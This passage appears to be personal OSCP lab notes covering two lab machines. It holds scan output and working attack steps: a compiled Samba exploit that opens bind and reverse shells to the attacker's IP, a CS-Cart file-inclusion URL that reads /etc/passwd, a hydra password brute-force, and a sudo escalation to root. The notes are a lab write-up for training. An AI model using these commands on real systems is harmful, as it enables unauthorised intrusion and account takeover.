/>SERVICE_NAME: MSFtpsvc<br />DISPLAY_NAME: FTP Publishing<br />        TYPE               : 20  WIN32_SHARE_PROCESS <br />        STATE              : 4  RUNNING <br />                                (STOPPABLE,PAUSABLE,ACCEPTS_SHUTDOWN)<br />        WIN32_EXIT_CODE    : 0	(0x0)<br />        SERVICE_EXIT_CODE  : 0	(0x0)<br />        CHECKPOINT         : 0x0<br />        WAIT_HINT          : 0x0<br /><br />SERVICE_NAME: Netman<br />DISPLAY_NAME: Network Connections<br />        TYPE               : 120  WIN32_SHARE_PROCESS (interactive)<br />        STATE              : 4  RUNNING <br />                                (STOPPABLE,NOT_PAUSABLE,IGNORES_SHUTDOWN)<br />        WIN32_EXIT_CODE    : 0	(0x0)<br />        SERVICE_EXIT_CODE  : 0	(0x0)<br />        CHECKPOINT         : 0x0<br />        WAIT_HINT          : 0x0<br /><br />SERVICE_NAME: Nla<br />DISPLAY_NAME: Network Location Awareness (NLA)<br />        TYPE               : 20  WIN32_SHARE_PROCESS <br />        STATE              : 4  RUNNING <br />                                (STOPPABLE,NOT_PAUSABLE,IGNORES_SHUTDOWN)<br />        WIN32_EXIT_CODE    : 0	(0x0)<br />        SERVICE_EXIT_CODE  : 0	(0x0)<br />        CHECKPOINT         : 0x0<br />        WAIT_HINT          : 0x0<br /><br />SERVICE_NAME: PlugPlay<br />DISPLAY_NAME: Plug and Play<br />        TYPE               : 20  WIN32_SHARE_PROCESS <br />        STATE              : 4  RUNNING <br />                                (NOT_STOPPABLE,NOT_PAUSABLE,ACCEPTS_SHUTDOWN)<br />        WIN32_EXIT_CODE    : 0	(0x0)<br />        SERVICE_EXIT_CODE  : 0	(0x0)<br />        CHECKPOINT         : 0x0<br />        WAIT_HINT          : 0x0<br /><br />SERVICE_NAME: RasMan<br />DISPLAY_NAME: Remote Access Connection Manager<br />        TYPE               : 20  WIN32_SHARE_PROCESS <br />        STATE              : 4  RUNNING <br />                                (STOPPABLE,NOT_PAUSABLE,IGNORES_SHUTDOWN)<br />        WIN32_EXIT_CODE    : 0	(0x0)<br />        SERVICE_EXIT_CODE  : 0	(0x0)<br />        CHECKPOINT         : 0x0<br />        WAIT_HINT          : 0x0<br /><br />SERVICE_NAME: RemoteRegistry<br />DISPLAY_NAME: Remote Registry<br />        TYPE               : 20  WIN32_SHARE_PROCESS <br />        STATE              : 4  RUNNING <br />                                (STOPPABLE,NOT_PAUSABLE,IGNORES_SHUTDOWN)<br />        WIN32_EXIT_CODE    : 0	(0x0)<br />        SERVICE_EXIT_CODE  : 0	(0x0)<br />        CHECKPOINT         : 0x0<br />        WAIT_HINT          : 0x0<br /><br />SERVICE_NAME: RpcSs<br />DISPLAY_NAME: Remote Procedure Call (RPC)<br />        TYPE               : 20  WIN32_SHARE_PROCESS <br />        STATE              : 4  RUNNING <br />                                (NOT_STOPPABLE,NOT_PAUSABLE,IGNORES_SHUTDOWN)<br />        WIN32_EXIT_CODE    : 0	(0x0)<br />        SERVICE_EXIT_CODE  : 0	(0x0)<br />        CHECKPOINT         : 0x0<br />        WAIT_HINT          : 0x0<br /><br />SERVICE_NAME: SamSs<br />DISPLAY_NAME: Security Accounts Manager<br />        TYPE               : 20  WIN32_SHARE_PROCESS <br />        STATE              : 4  RUNNING <br />                                (NOT_STOPPABLE,NOT_PAUSABLE,IGNORES_SHUTDOWN)<br />        WIN32_EXIT_CODE    : 0	(0x0)<br />        SERVICE_EXIT_CODE  : 0	(0x0)<br />        CHECKPOINT         : 0x0<br />        WAIT_HINT          : 0x0<br /><br />SERVICE_NAME: Schedule<br />DISPLAY_NAME: Task Scheduler<br />        TYPE               : 120  WIN32_SHARE_PROCESS (interactive)<br />        STATE              : 4  RUNNING <br />                                (STOPPABLE,PAUSABLE,ACCEPTS_SHUTDOWN)<br />        WIN32_EXIT_CODE    : 0	(0x0)<br />        SERVICE_EXIT_CODE  : 0	(0x0)<br />        CHECKPOINT         : 0x0<br />        WAIT_HINT          : 0x0<br /><br />SERVICE_NAME: seclogon<br />DISPLAY_NAME: Secondary Logon<br />        TYPE               : 120  WIN32_SHARE_PROCESS (interactive)<br />        STATE              : 4  RUNNING <br />                                (STOPPABLE,PAUSABLE,IGNORES_SHUTDOWN)<br />        WIN32_EXIT_CODE    : 0	(0x0)<br />        SERVICE_EXIT_CODE  : 0	(0x0)<br />        CHECKPOINT         : 0x0<br />        WAIT_HINT          : 0x0<br /><br />SERVICE_NAME: SENS<br />DISPLAY_NAME: System Event Notification<br />        TYPE               : 20  WIN32_SHARE_PROCESS <br />        STATE              : 4  RUNNING <br />                                (STOPPABLE,NOT_PAUSABLE,IGNORES_SHUTDOWN)<br />        WIN32_EXIT_CODE    : 0	(0x0)<br />        SERVICE_EXIT_CODE  : 0	(0x0)<br />        CHECKPOINT         : 0x0<br />        WAIT_HINT          : 0x0<br /><br />SERVICE_NAME: SharedAccess<br />DISPLAY_NAME: Internet Connection Firewall (ICF) / Internet Connection Sharing (ICS)<br />        TYPE               : 20  WIN32_SHARE_PROCESS <br />        STATE              : 4  RUNNING <br />                                (STOPPABLE,NOT_PAUSABLE,IGNORES_SHUTDOWN)<br />        WIN32_EXIT_CODE    : 0	(0x0)<br />        SERVICE_EXIT_CODE  : 0	(0x0)<br />        CHECKPOINT         : 0x0<br />        WAIT_HINT          : 0x0<br /><br />SERVICE_NAME: ShellHWDetection<br />DISPLAY_NAME: Shell Hardware Detection<br />        TYPE               : 20  WIN32_SHARE_PROCESS <br />        STATE              : 4  RUNNING <br />                                (STOPPABLE,PAUSABLE,ACCEPTS_SHUTDOWN)<br />        WIN32_EXIT_CODE    : 0	(0x0)<br />        SERVICE_EXIT_CODE  : 0	(0x0)<br />        CHECKPOINT         : 0x0<br />        WAIT_HINT          : 0x0<br /><br />SERVICE_NAME: SNMP<br />DISPLAY_NAME: SNMP Service<br />        TYPE               : 10  WIN32_OWN_PROCESS <br />        STATE              : 4  RUNNING <br />                                (STOPPABLE,NOT_PAUSABLE,IGNORES_SHUTDOWN)<br />        WIN32_EXIT_CODE    : 0	(0x0)<br />        SERVICE_EXIT_CODE  : 0	(0x0)<br />        CHECKPOINT         : 0x0<br />        WAIT_HINT          : 0x0<br /><br />SERVICE_NAME: TapiSrv<br />DISPLAY_NAME: Telephony<br />        TYPE               : 20  WIN32_SHARE_PROCESS <br />        STATE              : 4  RUNNING <br />                                (STOPPABLE,PAUSABLE,IGNORES_SHUTDOWN)<br />        WIN32_EXIT_CODE    : 0	(0x0)<br />        SERVICE_EXIT_CODE  : 0	(0x0)<br />        CHECKPOINT         : 0x0<br />        WAIT_HINT          : 0x0<br /><br />SERVICE_NAME: TermService<br />DISPLAY_NAME: Terminal Services<br />        TYPE               : 20  WIN32_SHARE_PROCESS <br />        STATE              : 4  RUNNING <br />                                (NOT_STOPPABLE,NOT_PAUSABLE,IGNORES_SHUTDOWN)<br />        WIN32_EXIT_CODE    : 0	(0x0)<br />        SERVICE_EXIT_CODE  : 0	(0x0)<br />        CHECKPOINT         : 0x0<br />        WAIT_HINT          : 0x0<br /><br />SERVICE_NAME: Themes<br />DISPLAY_NAME: Themes<br />        TYPE               : 20  WIN32_SHARE_PROCESS <br />        STATE              : 4  RUNNING <br />                                (STOPPABLE,NOT_PAUSABLE,ACCEPTS_SHUTDOWN)<br />        WIN32_EXIT_CODE    : 0	(0x0)<br />        SERVICE_EXIT_CODE  : 0	(0x0)<br />        CHECKPOINT         : 0x0<br />        WAIT_HINT          : 0x0<br /><br />SERVICE_NAME: TrkWks<br />DISPLAY_NAME: Distributed Link Tracking Client<br />        TYPE               : 20  WIN32_SHARE_PROCESS <br />        STATE              : 4  RUNNING <br />                                (STOPPABLE,NOT_PAUSABLE,ACCEPTS_SHUTDOWN)<br />        WIN32_EXIT_CODE    : 0	(0x0)<br />        SERVICE_EXIT_CODE  : 0	(0x0)<br />        CHECKPOINT         : 0x0<br />        WAIT_HINT          : 0x0<br /><br />SERVICE_NAME: uploadmgr<br />DISPLAY_NAME: Upload Manager<br />        TYPE               : 20  WIN32_SHARE_PROCESS <br />        STATE              : 4  RUNNING <br />                                (STOPPABLE,NOT_PAUSABLE,IGNORES_SHUTDOWN)<br />        WIN32_EXIT_CODE    : 0	(0x0)<br />        SERVICE_EXIT_CODE  : 0	(0x0)<br />        CHECKPOINT         : 0x0<br />        WAIT_HINT          : 0x0<br /><br />SERVICE_NAME: VMTools<br />DISPLAY_NAME: VMTools<br />        TYPE               : 110  WIN32_OWN_PROCESS (interactive)<br />        STATE              : 4  RUNNING <br />                                (STOPPABLE,PAUSABLE,ACCEPTS_SHUTDOWN)<br />        WIN32_EXIT_CODE    : 0	(0x0)<br />        SERVICE_EXIT_CODE  : 0	(0x0)<br />        CHECKPOINT         : 0x0<br />        WAIT_HINT          : 0x0<br /><br />SERVICE_NAME: W3SVC<br />DISPLAY_NAME: World Wide Web Publishing<br />        TYPE               : 20  WIN32_SHARE_PROCESS <br />        STATE              : 4  RUNNING <br />                                (STOPPABLE,PAUSABLE,ACCEPTS_SHUTDOWN)<br />        WIN32_EXIT_CODE    : 0	(0x0)<br />        SERVICE_EXIT_CODE  : 0	(0x0)<br />        CHECKPOINT         : 0x0<br />        WAIT_HINT          : 0x0<br /><br />SERVICE_NAME: WebClient<br />DISPLAY_NAME: WebClient<br />        TYPE               : 20  WIN32_SHARE_PROCESS <br />        STATE              : 4  RUNNING <br />                                (STOPPABLE,NOT_PAUSABLE,ACCEPTS_SHUTDOWN)<br />        WIN32_EXIT_CODE    : 0	(0x0)<br />        SERVICE_EXIT_CODE  : 0	(0x0)<br />        CHECKPOINT         : 0x0<br />        WAIT_HINT          : 0x0<br /><br />SERVICE_NAME: winmgmt<br />DISPLAY_NAME: Windows Management Instrumentation<br />        TYPE               : 20  WIN32_SHARE_PROCESS <br />        STATE              : 4  RUNNING <br />                                (STOPPABLE,PAUSABLE,ACCEPTS_SHUTDOWN)<br />        WIN32_EXIT_CODE    : 0	(0x0)<br />        SERVICE_EXIT_CODE  : 0	(0x0)<br />        CHECKPOINT         : 0x0<br />        WAIT_HINT          : 0x0<br /><br />    </div><div class='page'><h1 class='title level-5'>screenshot</h1><br/></div><div class='page'><h1 class='title level-4'>22 Barry</h1><br/>nmap came back with a ton of shit<br />The webpages looked... familiar..<br />turns out this is identical to kioptrix 1.0<br /><br /><a href="https://www.exploit-db.com/exploits/10">https://www.exploit-db.com/exploits/10</a><br />download the exploit<br />gcc 10.c -o samba<br /><br />run it<br />./samba  -b=0 10.11.1.22<br /><br />this makes a bind shell. if you want a reverse you may need to go into the 10.c file edit  795, 796, 797 (maybe just remove it, i havent tried it)<br />gcc 10.c -o samba1<br />./samba1 -b=0 -c 10.11.0.186 10.11.1.22<br /><br /><br /><a href="https://www.hackingarticles.in/hack-the-kioptrix-level-1/">https://www.hackingarticles.in/hack-the-kioptrix-level-1/</a></div><div class='page'><h1 class='title level-5'>enumeration</h1><br/></div><div class='page'><h1 class='title level-6'>nmap</h1><br/>nmap 10.11.1.22<br />Starting Nmap 7.70 ( https://nmap.org ) at 2019-11-26 08:35 EST<br />Nmap scan report for 10.11.1.22<br />Host is up (0.040s latency).<br />Not shown: 989 closed ports<br />PORT      STATE SERVICE<br />21/tcp    open  ftp<br />22/tcp    open  ssh<br />23/tcp    open  telnet<br />25/tcp    open  smtp<br />80/tcp    open  http<br />111/tcp   open  rpcbind<br />139/tcp   open  netbios-ssn<br />199/tcp   open  smux<br />443/tcp   open  https<br />995/tcp   open  pop3s<br />32768/tcp open  filenet-tms<br />MAC Address: 00:50:56:89:72:34 (VMware)<br /><br />Nmap done: 1 IP address (1 host up) scanned in 1.94 seconds<br />root@kali:~/Desktop/Machines/OSCP/22# <br /></div><div class='page'><h1 class='title level-6'>reg nmap</h1><br/>nmap -sC -sV -p- 10.11.1.22<br />Starting Nmap 7.70 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2019-11-26 08:37 EST<br />Nmap scan report for 10.11.1.22<br />Host is up (0.037s latency).<br />Not shown: 65524 closed ports<br />PORT      STATE SERVICE     VERSION<br />21/tcp    open  ftp?<br />22/tcp    open  ssh         OpenSSH 3.1p1 (protocol 1.99)<br />| ssh-hostkey: <br />|   1024 4a:e3:f8:07:d5:d6:b1:b5:bf:54:ac:e7:17:36:7e:e8 (RSA1)<br />|   1024 77:67:f2:2c:3d:7c:45:24:fe:5e:0f:de:07:65:b3:57 (DSA)<br />|_  1024 42:b1:48:0b:41:f8:a9:12:cc:9b:c4:ed:26:74:64:2c (RSA)<br />|_sshv1: Server supports SSHv1<br />23/tcp    open  telnet?<br />25/tcp    open  smtp?<br />|_smtp-commands: Couldn&#39;t establish connection on port 25<br />80/tcp    open  http        Apache httpd 1.3.23 ((Unix)  (Red-Hat/Linux) mod_python/2.7.6 Python/1.5.2 mod_ssl/2.8.7 OpenSSL/0.9.6b DAV/1.0.3 PHP/4.1.2 mod_perl/1.26 mod_throttle/3.1.2)<br />| http-methods: <br />|_  Potentially risky methods: PUT DELETE CONNECT PATCH PROPFIND PROPPATCH MKCOL COPY MOVE LOCK UNLOCK TRACE<br />|_http-server-header: Apache/1.3.23 (Unix)  (Red-Hat/Linux) mod_python/2.7.6 Python/1.5.2 mod_ssl/2.8.7 OpenSSL/0.9.6b DAV/1.0.3 PHP/4.1.2 mod_perl/1.26 mod_throttle/3.1.2<br />|_http-title: Test Page for the Apache Web Server on Red Hat Linux<br />111/tcp   open  rpcbind     2 (RPC #100000)<br />| rpcinfo: <br />|   program version   port/proto  service<br />|   100000  2            111/tcp  rpcbind<br />|   100000  2            111/udp  rpcbind<br />|   100024  1          32768/tcp  status<br />|_  100024  1          32768/udp  status<br />139/tcp   open  netbios-ssn Samba smbd (workgroup: MYGROUP)<br />199/tcp   open  smux        Linux SNMP multiplexer<br />443/tcp   open  ssl/https   Apache/1.3.23 (Unix)  (Red-Hat/Linux) mod_python/2.7.6 Python/1.5.2 mod_ssl/2.8.<br />|_http-server-header: Apache/1.3.23 (Unix)  (Red-Hat/Linux) mod_python/2.7.6 Python/1.5.2 mod_ssl/2.8.7 OpenSSL/0.9.6b DAV/1.0.3 PHP/4.1.2 mod_perl/1.26 mod_throttle/3.1.2<br />|_http-title: 400 Bad Request<br />|_ssl-date: 2019-11-26T13:40:57+00:00; -5s from scanner time.<br />| sslv2: <br />|   SSLv2 supported<br />|   ciphers: <br />|     SSL2_RC2_128_CBC_EXPORT40_WITH_MD5<br />|     SSL2_RC4_64_WITH_MD5<br />|     SSL2_DES_64_CBC_WITH_MD5<br />|     SSL2_DES_192_EDE3_CBC_WITH_MD5<br />|     SSL2_RC2_128_CBC_WITH_MD5<br />|     SSL2_RC4_128_WITH_MD5<br />|_    SSL2_RC4_128_EXPORT40_WITH_MD5<br />995/tcp   open  ssl/pop3s?<br />|_ssl-date: 2019-11-26T13:40:57+00:00; -5s from scanner time.<br />| sslv2: <br />|   SSLv2 supported<br />|   ciphers: <br />|     SSL2_RC2_128_CBC_EXPORT40_WITH_MD5<br />|     SSL2_DES_192_EDE3_CBC_WITH_MD5<br />|     SSL2_RC2_128_CBC_WITH_MD5<br />|     SSL2_RC4_128_WITH_MD5<br />|_    SSL2_RC4_128_EXPORT40_WITH_MD5<br />32768/tcp open  status      1 (RPC #100024)<br />MAC Address: 00:50:56:89:72:34 (VMware)<br />Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br /><br />Host script results:<br />|_clock-skew: mean: -5s, deviation: 0s, median: -5s<br />|_nbstat: NetBIOS name: BARRY, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)<br />|_smb2-time: Protocol negotiation failed (SMB2)<br /><br />Service detection performed. Please report any incorrect results at <a href="https://nmap.org/submit/">https://nmap.org/submit/</a> .<br />Nmap done: 1 IP address (1 host up) scanned in 489.57 seconds<br />root@kali:~/Desktop/Machines/OSCP/22# <br /></div><div class='page'><h1 class='title level-6'>80</h1><br/></div><div class='page'><h1 class='title level-7'>nmap</h1><br/>PORT   STATE SERVICE REASON         VERSION<br />80/tcp open  http    syn-ack ttl 64 Apache httpd 1.3.23 ((Unix)  (Red-Hat/Linux) mod_python/2.7.6 Python/1.5.2 mod_ssl/2.8.7 OpenSSL/0.9.6b DAV/1.0.3 PHP/4.1.2 mod_perl/1.26 mod_throttle/3.1.2)<br />|_http-server-header: Apache/1.3.23 (Unix)  (Red-Hat/Linux) mod_python/2.7.6 Python/1.5.2 mod_ssl/2.8.7 OpenSSL/0.9.6b DAV/1.0.3 PHP/4.1.2 mod_perl/1.26 mod_throttle/3.1.2<br />MAC Address: 00:50:56:89:72:34 (VMware)<br /><br /></div><div class='page'><h1 class='title level-7'>nikto</h1><br/>nikto -host <a href="http://10.11.1.22:80">http://10.11.1.22:80</a> | tee nikto_10.11.1.22:80<br />- Nikto v2.1.6<br />---------------------------------------------------------------------------<br />+ Target IP:          10.11.1.22<br />+ Target Hostname:    10.11.1.22<br />+ Target Port:        80<br />+ Start Time:         2019-11-26 08:37:48 (GMT-5)<br />---------------------------------------------------------------------------<br />+ Server: Apache/1.3.23 (Unix)  (Red-Hat/Linux) mod_python/2.7.6 Python/1.5.2 mod_ssl/2.8.7 OpenSSL/0.9.6b DAV/1.0.3 PHP/4.1.2 mod_perl/1.26 mod_throttle/3.1.2<br />+ Server leaks inodes via ETags, header found with file /, inode: 244119, size: 2890, mtime: Tue Apr  9 14:56:58 2002<br />+ The anti-clickjacking X-Frame-Options header is not present.<br />+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS<br />+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type<br />+ OpenSSL/0.9.6b appears to be outdated (current is at least 1.0.1j). OpenSSL 1.0.0o and 0.9.8zc are also current.<br />+ mod_perl/1.26 appears to be outdated (current is at least 2.0.7)<br />+ Apache/1.3.23 appears to be outdated (current is at least Apache/2.4.12). Apache 2.0.65 (final release) and 2.2.29 are also current.<br />+ DAV/1.0.3 appears to be outdated (current is at least 2)<br />+ mod_ssl/2.8.7 appears to be outdated (current is at least 2.8.31) (may depend on server version)<br />+ mod_throttle/3.1.2 appears to be outdated (current is at least 3.2.0)<br />+ PHP/4.1.2 appears to be outdated (current is at least 5.6.9). PHP 5.5.25 and 5.4.41 are also current.<br />+ mod_python/2.7.6 appears to be outdated (current is at least 3.3.1)<br />+ Python/1.5.2 appears to be outdated (current is at least 2.7.5)<br />+ OSVDB-27487: Apache is vulnerable to XSS via the Expect header<br />+ Allowed HTTP Methods: GET, HEAD, OPTIONS, TRACE, POST, PUT, DELETE, CONNECT, PATCH, PROPFIND, PROPPATCH, MKCOL, COPY, MOVE, LOCK, UNLOCK <br />+ OSVDB-397: HTTP method (&#39;Allow&#39; Header): &#39;PUT&#39; method could allow clients to save files on the web server.<br />+ OSVDB-5646: HTTP method (&#39;Allow&#39; Header): &#39;DELETE&#39; may allow clients to remove files on the web server.<br />+ HTTP method (&#39;Allow&#39; Header): &#39;CONNECT&#39; may allow server to proxy client requests.<br />+ HTTP method: &#39;PATCH&#39; may allow client to issue patch commands to server. See RFC-5789.<br />+ OSVDB-5647: HTTP method (&#39;Allow&#39; Header): &#39;MOVE&#39; may allow clients to change file locations on the web server.<br />+ WebDAV enabled (MKCOL UNLOCK COPY PROPPATCH PROPFIND LOCK listed as allowed)<br />+ OSVDB-877: HTTP TRACE method is active, suggesting the host is vulnerable to XST<br />+ OSVDB-838: Apache/1.3.23 - Apache 1.x up 1.2.34 are vulnerable to a remote DoS and possible code execution. CAN-2002-0392.<br />+ OSVDB-4552: Apache/1.3.23 - Apache 1.3 below 1.3.27 are vulnerable to a local buffer overflow which allows attackers to kill any process on the system. CAN-2002-0839.<br />+ OSVDB-2733: Apache/1.3.23 - Apache 1.3 below 1.3.29 are vulnerable to overflows in mod_rewrite and mod_cgi. CAN-2003-0542.<br />+ mod_python/2.7.6 - mod_python 2.7.6 or older may allow attackers to execute functions remotely.<br />+ PHP/4.1.2 mod_perl/1.26 mod_throttle/3.1.2 - PHP below 4.3.3 may allow local attackers to safe mode and gain access to unauthorized files. <a href="http://www.securityfocus.com/bid/8201.">http://www.securityfocus.com/bid/8201.</a><br />+ ///etc/hosts: The server install allows reading of any system file by adding an extra &#39;/&#39; to the URL.<br />+ OSVDB-682: /usage/: Webalizer may be installed. Versions lower than 2.01-09 vulnerable to Cross Site Scripting (XSS). <a href="http://www.cert.org/advisories/CA-2000-02.html.">http://www.cert.org/advisories/CA-2000-02.html.</a><br />+ OSVDB-3268: /manual/: Directory indexing found.<br />+ OSVDB-3092: /manual/: Web server manual found.<br />+ OSVDB-3268: /icons/: Directory indexing found.<br />+ ERROR: Error limit (20) reached for host, giving up. Last error: error reading HTTP response<br />+ Scan terminated:  20 error(s) and 32 item(s) reported on remote host<br />+ End Time:           2019-11-26 08:49:31 (GMT-5) (703 seconds)<br />---------------------------------------------------------------------------<br />+ 1 host(s) tested<br /></div><div class='page'><h1 class='title level-7'>dirsearch</h1><br/>python3 /root/Desktop/Tools/dirsearch/dirsearch.py -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -e php -f -t 20 -u <a href="http://10.11.1.22:80">http://10.11.1.22:80</a> --simple-report dirsearchsimple_10.11.1.22:80<br /><br /> _|. _ _  _  _  _ _|_    v0.3.8<br />(_||| _) (/_(_|| (_| )<br /><br />Extensions: php | HTTP method: get | Threads: 20 | Wordlist size: 441041<br /><br />Error Log: /root/Desktop/Tools/dirsearch/logs/errors-19-11-26_08-37-49.log<br /><br />Target: <a href="http://10.11.1.22:80">http://10.11.1.22:80</a><br /><br />[08:37:49] Starting: <br />[08:37:50] 403 -  272B  - /cgi-bin/<br />[08:37:50] 200 -   18KB - /icons/<br />[08:37:56] 200 -  643B  - /manual/<br />[08:38:01] 200 -    5KB - /usage/<br />[08:38:08] 403 -  268B  - /doc/<br />[08:38:21] 200 -   18KB - /mrtg/<br />[08:59:33] 403 -  273B  - /%7Ewilliam/<br />[09:00:43] 403 -  270B  - /%7Eadam/<br /><br />Task Completed<br /></div><div class='page'><h1 class='title level-6'>443</h1><br/></div><div class='page'><h1 class='title level-7'>nmap</h1><br/>PORT    STATE SERVICE   REASON         VERSION<br />443/tcp open  ssl/https syn-ack ttl 64 Apache/1.3.23 (Unix)  (Red-Hat/Linux) mod_python/2.7.6 Python/1.5.2 mod_ssl/2.8.<br />|_http-server-header: Apache/1.3.23 (Unix)  (Red-Hat/Linux) mod_python/2.7.6 Python/1.5.2 mod_ssl/2.8.7 OpenSSL/0.9.6b DAV/1.0.3 PHP/4.1.2 mod_perl/1.26 mod_throttle/3.1.2<br />MAC Address: 00:50:56:89:72:34 (VMware)<br /></div><div class='page'><h1 class='title level-7'>nikto</h1><br/>nikto -host <a href="http://10.11.1.22:443">http://10.11.1.22:443</a> | tee nikto_10.11.1.22:443<br />- Nikto v2.1.6<br />---------------------------------------------------------------------------<br />+ Target IP:          10.11.1.22<br />+ Target Hostname:    10.11.1.22<br />+ Target Port:        443<br />+ Start Time:         2019-11-26 08:37:49 (GMT-5)<br />---------------------------------------------------------------------------<br />+ Server: Apache/1.3.23 (Unix)  (Red-Hat/Linux) mod_python/2.7.6 Python/1.5.2 mod_ssl/2.8.7 OpenSSL/0.9.6b DAV/1.0.3 PHP/4.1.2 mod_perl/1.26 mod_throttle/3.1.2<br />+ The anti-clickjacking X-Frame-Options header is not present.<br />+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS<br />+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type<br />+ No CGI Directories found (use &#39;-C all&#39; to force check all possible dirs)<br />+ mod_python/2.7.6 appears to be outdated (current is at least 3.3.1)<br />+ mod_ssl/2.8.7 appears to be outdated (current is at least 2.8.31) (may depend on server version)<br />+ DAV/1.0.3 appears to be outdated (current is at least 2)<br />+ mod_perl/1.26 appears to be outdated (current is at least 2.0.7)<br />+ OpenSSL/0.9.6b appears to be outdated (current is at least 1.0.1j). OpenSSL 1.0.0o and 0.9.8zc are also current.<br />+ mod_throttle/3.1.2 appears to be outdated (current is at least 3.2.0)<br />+ Python/1.5.2 appears to be outdated (current is at least 2.7.5)<br />+ PHP/4.1.2 appears to be outdated (current is at least 5.6.9). PHP 5.5.25 and 5.4.41 are also current.<br />+ Apache/1.3.23 appears to be outdated (current is at least Apache/2.4.12). Apache 2.0.65 (final release) and 2.2.29 are also current.<br />+ OSVDB-27487: Apache is vulnerable to XSS via the Expect header<br />+ OSVDB-838: Apache/1.3.23 - Apache 1.x up 1.2.34 are vulnerable to a remote DoS and possible code execution. CAN-2002-0392.<br />+ OSVDB-4552: Apache/1.3.23 - Apache 1.3 below 1.3.27 are vulnerable to a local buffer overflow which allows attackers to kill any process on the system. CAN-2002-0839.<br />+ OSVDB-2733: Apache/1.3.23 - Apache 1.3 below 1.3.29 are vulnerable to overflows in mod_rewrite and mod_cgi. CAN-2003-0542.<br />+ mod_python/2.7.6 - mod_python 2.7.6 or older may allow attackers to execute functions remotely.<br />+ PHP/4.1.2 mod_perl/1.26 mod_throttle/3.1.2 - PHP below 4.3.3 may allow local attackers to safe mode and gain access to unauthorized files. <a href="http://www.securityfocus.com/bid/8201.">http://www.securityfocus.com/bid/8201.</a><br />+ ///etc/hosts: The server install allows reading of any system file by adding an extra &#39;/&#39; to the URL.<br />+ 7550 requests: 14 error(s) and 19 item(s) reported on remote host<br />+ End Time:           2019-11-26 08:47:34 (GMT-5) (585 seconds)<br />---------------------------------------------------------------------------<br />+ 1 host(s) tested<br />root@kali:~/Desktop/Machines/OSCP/22# <br /><br /><br /></div><div class='page'><h1 class='title level-7'>dirsearch</h1><br/></div><div class='page'><h1 class='title level-5'>proof</h1><br/>da690f91f46eb888719fe942efed2993</div><div class='page'><h1 class='title level-5'>screenshot</h1><br/><a href=""><img src="images/478-1.png" alt="images/478-1.png" /></a></div><div class='page'><h1 class='title level-4'>24 Payday</h1><br/>nmap showed an assload of ports open 80 being one of them<br />Going to the webpage showed me that it is running cs cart<br />searchsploit told me that cs cart was vulnerable<br />10.11.1.24/install.php showed me the version was 1.3.3<br />searchsploit pointed me to <a href="file:///usr/share/exploitdb/exploits/php/webapps/1872.txt">/usr/share/exploitdb/exploits/php/webapps/1872.txt</a><br /><a href="http://10.11.1.24/classes/phpmailer/class.cs_phpmailer.php?classes_dir=/etc/passwd%00">http://10.11.1.24/classes/phpmailer/class.cs_phpmailer.php?classes_dir=/etc/passwd%00</a><br />^^gave me /etc/passwd!!!<br />patrick is a user!! send to hydra with tirefire and rockyou...BOOM user patrick password patrick<br />ssh in... user shell!!<br /><br /><br />poke around...nothing special<br />sudo -l says I can do it all<br />sudo /bin/bash -i<br />whoami<br />    root</div><div class='page'><h1 class='title level-5'>enumeration</h1><br/></div><div class='page'><h1 class='title level-6'>nmap</h1><br/>nmap 10.11.1.24<br />Starting Nmap 7.70 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2019-11-20 20:33 EST<br />Nmap scan report for 10.11.1.24<br />Host is up (0.061s latency).<br />Not shown: 992 closed ports<br />PORT    STATE SERVICE<br />22/tcp  open  ssh<br />80/tcp  open  http<br />110/tcp open  pop3<br />139/tcp open  netbios-ssn<br />143/tcp open  imap<br />445/tcp open  microsoft-ds<br />993/tcp open  imaps<br />995/tcp open  pop3s<br />MAC Address: 00:50:56:89:56:69 (VMware)<br /><br />Nmap done: 1 IP address (1 host up) scanned in 2.31 seconds<br /></div><div class='page'><h1 class='title level-6'>big nmap </h1><br/>nmap -sC -sV -p- 10.11.1.24<br />Starting Nmap 7.70 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2019-11-20 20:33 EST<br />Nmap scan report for 10.11.1.24<br />Host is up (0.054s latency).<br />Not shown: 65527 closed ports<br />PORT    STATE SERVICE     VERSION<br />22/tcp  open  ssh         OpenSSH 4.6p1 Debian 5build1 (protocol 2.0)<br />| ssh-hostkey: <br />|   1024 f3:6e:87:04:ea:2d:b3:60:ff:42:ad:26:67:17:94:d5 (DSA)<br />|_  2048 bb:03:ce:ed:13:f1:9a:9e:36:03:e2:af:ca:b2:35:04 (RSA)<br />80/tcp  open  http        Apache httpd 2.2.4 ((Ubuntu) PHP/5.2.3-1ubuntu6)<br />|_http-server-header: Apache/2.2.4 (Ubuntu) PHP/5.2.3-1ubuntu6<br />|_http-title: CS-Cart. Powerful PHP shopping cart software<br />110/tcp open  pop3        Dovecot pop3d<br />|_pop3-capabilities: CAPA UIDL TOP RESP-CODES PIPELINING SASL STLS<br />| ssl-cert: Subject: commonName=ubuntu01/organizationName=OCOSA/stateOrProvinceName=There is no such thing outside US/countryName=XX<br />| Not valid before: 2008-04-25T02:02:48<br />|_Not valid after:  2008-05-25T02:02:48<br />|_ssl-date: 2019-11-21T01:35:17+00:00; +6s from scanner time.<br />| sslv2: <br />|   SSLv2 supported<br />|   ciphers: <br />|     SSL2_RC4_128_WITH_MD5<br />|     SSL2_RC4_128_EXPORT40_WITH_MD5<br />|     SSL2_RC2_128_CBC_WITH_MD5<br />|     SSL2_DES_192_EDE3_CBC_WITH_MD5<br />|_    SSL2_RC2_128_CBC_EXPORT40_WITH_MD5<br />139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: MSHOME)<br />143/tcp open  imap        Dovecot imapd<br />|_imap-capabilities: LOGINDISABLEDA0001 STARTTLS IDLE completed SORT Capability MULTIAPPEND UNSELECT CHILDREN LITERAL+ SASL-IR IMAP4rev1 NAMESPACE OK THREAD=REFERENCES LOGIN-REFERRALS<br />| ssl-cert: Subject: commonName=ubuntu01/organizationName=OCOSA/stateOrProvinceName=There is no such thing outside US/countryName=XX<br />| Not valid before: 